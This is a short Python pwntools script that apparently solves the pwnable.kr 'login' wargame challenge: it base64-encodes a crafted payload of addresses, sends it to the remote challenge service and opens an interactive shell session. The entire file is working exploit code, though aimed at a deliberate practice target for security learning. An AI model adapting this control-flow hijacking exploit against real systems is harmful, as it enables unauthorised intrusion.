#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
from base64 import b64encode
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    #  io = process("", env = {"LD_PRELOAD": ""})
    io = process("./login")

else:
    io = remote("pwnable.kr", 9003)

#  elf = ELF("")
#  libc = ELF("")

def DEBUG():
    raw_input("DEBUG: ")
    gdb.attach(io)

target = 0x8049278
buf = 0x811EB40
payload = p32(0xdeadbeef) + p32(target) + p32(buf)

#  DEBUG()
io.sendlineafter(" : ", b64encode(payload))

io.interactive()
io.close()

